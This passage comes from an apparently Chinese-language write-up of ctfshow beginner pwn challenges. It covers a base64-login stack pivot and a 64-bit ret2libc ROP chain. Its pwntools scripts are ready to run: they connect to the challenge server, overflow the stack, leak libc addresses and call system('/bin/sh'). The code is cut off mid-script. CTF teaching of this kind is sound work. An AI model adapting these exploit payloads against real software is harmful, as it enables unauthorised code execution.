	width="849"
	height="551"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/393_hu_bc4fd2ea7590cdb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/393_hu_cebbf7afd6536ad3.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="154"
		data-flex-basis="369px"
	
></p>
<p>ç­‰ç­‰ï¼Ÿï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/291.png"
	width="575"
	height="208"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/291_hu_657cdf66cd8f6ae.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/291_hu_d2065e36ccdbbacc.png 1024w"
	loading="lazy"
	
		alt="base64éƒ½å‡ºæ¥äº†ï¼Ÿ"
	
	
		class="gallery-image" 
		data-flex-grow="276"
		data-flex-basis="663px"
	
></p>
<p>æˆ‘å½“å¹´æ‚é¡¹å…¥é—¨CTFçš„ï¼Œè¿™ä¸œè¥¿æˆ‘çœ‹å¾ˆæ•æ„Ÿçš„ğŸ˜„ã€‚</p>
<p>è·Ÿè¿›Base64Decodeå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/292.png"
	width="1005"
	height="528"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/292_hu_55802cec0d56967b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/292_hu_6a06704573c72e4c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="456px"
	
></p>
<p>è¯´å®è¯çœ‹ä¸æ‡‚è¿™å‡½æ•°åœ¨å¹²å˜›çš„ï¼Œç›´æ¥ä¸Šgdbè°ƒè¯•ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/293.png"
	width="1490"
	height="535"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/293_hu_1ef6fd9c2a16da1f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/293_hu_e40fba3dd4bde123.png 1024w"
	loading="lazy"
	
		alt="èµ›æ’­å¨å­:https://cyberchef.org/"
	
	
		class="gallery-image" 
		data-flex-grow="278"
		data-flex-basis="668px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/294.png"
	width="1918"
	height="878"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/294_hu_e85464a5c46ddfbf.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/294_hu_72f0a4d7fa768765.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>æŒ‰ç…§å‡½æ•°è¡¨é¢æ„æ€ï¼Œæˆ‘åˆæ­¥åˆ¤æ–­æ˜¯ä¸€ä¸ªbase64çš„è§£ç å‡½æ•°ï¼Œé‚£æˆ‘å°±å°†ä¸€æ®µbase64ç¼–ç æ³¨å…¥è¿›ç¨‹åºè®©å®ƒè§£ç ï¼Œç”±è°ƒè¯•ç•Œé¢å¯çŸ¥ï¼Œæˆ‘çš„æ¨æ–­æ˜¯æ­£ç¡®çš„ã€‚</p>
<blockquote>
<p>å½“ç„¶åˆæœŸä½¿ç”¨gdbè°ƒè¯•ä¼šæ¯”è¾ƒæ…¢ä¸Šæ‰‹ï¼Œä½†å¦‚æœæ˜¯ç›´æ¥è¿›è¡Œä¼ªä»£ç ä»£ç å®¡è®¡çš„è¯ä¸€å®šä¼šåŠé€€ä½ å­¦PWNçš„ï¼Œæˆ‘é¼“åŠ±å¤§å®¶å¤šä½¿ç”¨gdbè°ƒè¯•ï¼Œèƒ½èŠ‚çœä¸€ç‚¹æ—¶é—´å»ç†è§£ä»£ç ã€‚å½“ç„¶ï¼Œä¸å¯å¦è®¤ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯æ²¡é”™çš„ï¼Œè¿™é‡Œä¹Ÿä»…ä»…æ˜¯ä¸ºäº†æé†’ä¸€ä¸‹å¤§å®¶ã€‚ï¼ˆä½ çœ‹åˆ°çš„ä¸œè¥¿ä¸ä¸€å®šéƒ½æ˜¯å¯¹çš„ï¼ï¼ï¼æˆ‘ä¸€ç›´å¼ºè°ƒè¿‡å¾ˆå¤šéï¼Œå¸Œæœ›èƒ½åœ¨ä»Šåå¸®åŠ©åˆ°å¤§å®¶ï¼‰</p>
</blockquote>
<p>è·Ÿè¿›correctå‡½æ•°ï¼Œå‘ç°åé—¨å‡½æ•°ï¼ï¼</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/295.png"
	width="630"
	height="184"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/295_hu_ce8994678cb52995.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/295_hu_95ae1c76dd28f5ed.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="821px"
	
></p>
<p>è·Ÿè¿›authå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/296.png"
	width="706"
	height="235"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/296_hu_7203d19fd2e2312b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/296_hu_d79e1c25c212609a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="300"
		data-flex-basis="721px"
	
></p>
<p>authå‡½æ•°ä¼šç”Ÿæˆè§£ç å†…å®¹çš„md5å“ˆå¸Œå€¼ï¼Œå¹¶ä¸”ä¸ç¨‹åºä¸­ä¿å­˜çš„å“ˆå¸Œå€¼è¿›è¡Œå¯¹æ¯”</p>
<p>é‡çœ‹mainå‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nb">int</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">28</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Eh</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">22</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="cl">  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v6</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">3</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;CTFshow login: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">_isoc99_scanf</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%30s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="nb">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xC</span><span class="n">u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">Base64Decode</span><span class="p">((</span><span class="nb">int</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&gt;</span> <span class="mi">12</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;Input Error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="nb">input</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">auth</span><span class="p">(</span><span class="n">v6</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">correct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>v7æ˜¯base64è§£ç åçš„é•¿åº¦ï¼Œå½“v7 &gt; 0xC(åè¿›åˆ¶ 12)çš„æ—¶å€™ï¼Œä¼šè¾“å‡ºâ€œInput Error!â€ç„¶åé€€å‡ºè¿›ç¨‹ã€‚</p>
<p><code>memcpy(&amp;input, v5, v7);</code>ä¼šæŠŠä» <code>v5</code> å¼€å§‹çš„ <code>v7</code> ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå®Œæ•´åœ°å¤åˆ¶åˆ° <code>input</code> å˜é‡æ‰€åœ¨çš„å†…å­˜åœ°å€å¤„ã€‚ï¼ˆè¿™é‡Œæœ‰ä¸ªå‘ï¼Œå°±æ˜¯å¦‚æœå¯¹ä¼ªä»£ç ä¸ç†Ÿæ‚‰çš„è¯ï¼Œä½ ä¼šè¯¯ä»¥ä¸ºè¿™æ˜¯inputå‡½æ•°çš„åœ°å€ï¼Œå…¶å®è¿™ä¸ª<code>input</code> æ˜¯ä¸€ä¸ª<strong>æ•°æ®å­˜å‚¨çš„å˜é‡ï¼ˆå‚æ•°ï¼‰</strong>ğŸ˜„ï¼‰ï¼›è¦æ³¨æ„çš„æ˜¯ï¼Œinputå‚æ•°è¢«æ§åˆ¶åœ¨12å­—èŠ‚ï¼ˆ0xCï¼‰å¤§å°å†…ï¼Œä¸è¶³ä¸æˆ‘ä»¬è¿›è¡Œæ³¨å…¥payloadï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦è¿›è¡Œ<strong>æ ˆè¿ç§»</strong></p>
<p>çœ‹å›æ±‡ç¼–ä»£ç ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/297.png"
	width="1393"
	height="618"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/297_hu_dfd79ddee950555c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/297_hu_859bb043e2e1810a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="225"
		data-flex-basis="540px"
	
></p>
<p>åœ¨æœ€åç»“æŸæ—¶ç»™æˆ‘ä»¬æ‰§è¡Œäº†ä¸€æ¬¡leaveæ±‡ç¼–æŒ‡ä»¤ã€‚</p>
<p>æ ˆè¿ç§»åˆ°å“ªï¼Ÿ</p>
<p>åœ¨mainå‡½æ•°ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªmemcpyï¼ŒæŠŠè§£ç åçš„æ•°æ®copyå¡«å……åˆ°äº†inputåœ°å€å¤„ï¼Œåœ¨ç¨‹åºå…³é—­PIEçš„æƒ…å†µä¸‹ï¼Œinputçš„åœ°å€å·²çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆåŠ«æŒæŒ‡é’ˆçš„æ–¹å¼ï¼ŒæŠŠæ•°æ®å¸ƒç½®åˆ°inputæ‰€åœ¨çš„bssæ®µï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/298.png"
	width="1043"
	height="419"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/298_hu_9cd1fc92c6ab2bf1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/298_hu_aa109912b118e8ab.png 1024w"
	loading="lazy"
	
		alt="bssåœ°å€ï¼š0x811EB40"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="597px"
	
></p>
<p>å¤§è‡´æ€è·¯å°±æ˜¯æ ˆè¿ç§»è°ƒç”¨<code>/bin/sh</code>æ¥gethellï¼Œä¸è¿‡éœ€è¦äº‹å…ˆå°†payloadè¿›è¡Œä¸€æ¬¡base64ç¼–ç åŠ å¯†ï¼Œå› ä¸ºç¨‹åºä¼šå°†æˆ‘ä»¬æ³¨å…¥çš„payloadè¿›è¡Œä¸€æ¬¡base64ç¼–ç è§£ç ã€‚</p>
<p>payloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">input_bss_address</span> <span class="o">=</span> <span class="mh">0x811EB40</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x8049284</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">input_bss_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>mainå‡½æ•°æœ‰leave ret == move esp ebp; pop ebp;ret;</p>
<p>æ‰€ä»¥espå¯„å­˜å™¨çš„å€¼è¦+4ï¼ˆpopå¼¹æ ˆä¼šå¤šå‡ºå››ä¸ªå­—èŠ‚ç©ºé—´ï¼Œéœ€è¦ç”¨4å­—èŠ‚åƒåœ¾å€¼å¡«å……ï¼‰ï¼Œæ‰€ä»¥payloadçš„å‰å››ä¸ªå­—èŠ‚å¡«å……åƒåœ¾æ•°æ®ã€‚</p>
<p>python2çš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28266</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_bss_address</span> <span class="o">=</span> <span class="mh">0x811EB40</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x8049284</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">input_bss_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_077">PWN_077
</h3><p>é¢˜ç›®ï¼šEz ROP or Mid ROP ?</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/423.png"
	width="779"
	height="199"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/423_hu_9001154faf5fd9db.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/423_hu_18c1e59953c06563.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="391"
		data-flex-basis="939px"
	
></p>
<p>64ä½å…³é—­Canaryã€PIEä¿æŠ¤ã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/424.png"
	width="754"
	height="186"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/424_hu_8fcdfcd518789bcd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/424_hu_c488a81f1e810ddb.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="405"
		data-flex-basis="972px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/425.png"
	width="764"
	height="439"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/425_hu_b3d3a30c83540e55.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/425_hu_8451cbe9f9c4be55.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="174"
		data-flex-basis="417px"
	
></p>
<p>æ²¡æœ‰åé—¨å‡½æ•°ï¼Œ64ä½ï¼ˆè€ƒè™‘æ ˆå¯¹é½ï¼‰ï¼Œè¿™é‡Œçš„ctfshowæ˜¯ä¸€ä¸ªæœ‰è¿ç»­è¯»å–åŠŸèƒ½çš„å‡½æ•°ï¼Œfgetcè¯»å–åˆ°æ¢è¡Œå°±ä¼šåœæ­¢ï¼Œä½†æ˜¯æ²¡æœ‰æ£€æŸ¥é•¿åº¦çš„åŠŸèƒ½ï¼Œæ‰€ä»¥è¿™é‡Œä¾æ—§æœ‰æ ˆæº¢å‡ºæ¼æ´å¯åˆ©ç”¨ï¼Œé‚£ä¹ˆå¤§è‡´æ€è·¯å°±æ˜¯æ³„éœ²ä¸€ä¸ªå‡½æ•°çœŸå®åœ°å€putsæˆ–è€…fgetcä¹Ÿè¡Œï¼Œè°ƒç”¨puts@pltæ‰“å°å®ƒçš„çœŸå®åœ°å€ï¼Œæ¥æ”¶ä¿å­˜åç”¨LibcSearcheræ¨¡å—æŸ¥æ‰¾libcç‰ˆæœ¬ï¼Œç„¶åç®—å‡ºLibcåŸºå€ï¼Œå†åæ¨æ„é€ å‡ºåé—¨å‡½æ•°å°±å¯ä»¥äº†ã€‚</p>
<p>ä»¥ä¸‹ä¸‰ç§è§£æ³•â€”â€”æ³„éœ²ä¸åŒå‡½æ•°ã€ç”¨æœ¬åœ°libcæ‰“ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸ªç–‘é—®å°±æ˜¯ï¼Œ<code>\x18ï¼ˆåè¿›åˆ¶æ˜¯24ï¼‰</code>æ˜¯å•¥ç©æ„ï¼Ÿå…¶å®è¿™é‡Œæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘ï¼Œæˆ‘ä¸€å¼€å§‹åšè¿™é¢˜æ˜¯ä¸€ä¸ªä¸ªå°è¯•çš„ï¼Œ\x00ã€\x22ç­‰ç­‰ï¼Œæˆ‘æ›´å€¾å‘äºå†™å¶æ•°ï¼Œå› ä¸ºè¿™æ˜¯64ä½ï¼Œæ¶‰åŠ16å€æ•°æ ˆå¯¹é½ã€‚â€˜</p>
<p><strong>è¿™é¢˜å®˜æ–¹WPä¹Ÿæ²¡æœ‰æ›´å¥½çš„è§£é‡Šï¼Œå¦‚æœä½ æœ‰æ›´å¥½çš„ç†è§£ï¼Œæ¬¢è¿æ¥äº¤æµï¼Œå¸Œæœ›æœ‰å¤§ä½¬èƒ½æ¥DDWï¼ï¼</strong></p>
<p>python3-exp1ï¼ˆæ³„éœ²fgetcå‡½æ•°ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28177</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fgetc_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;fgetc&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004008e3</span> <span class="c1">#0x00000000004008e3 : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000400576</span> <span class="c1">#0x0000000000400576 : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fgetc_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;T^T</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fgetc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;fgetc_address = &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">fgetc</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;fgetc&#34;</span><span class="p">,</span><span class="n">fgetc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">fgetc</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;fgetc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libc_base</span>
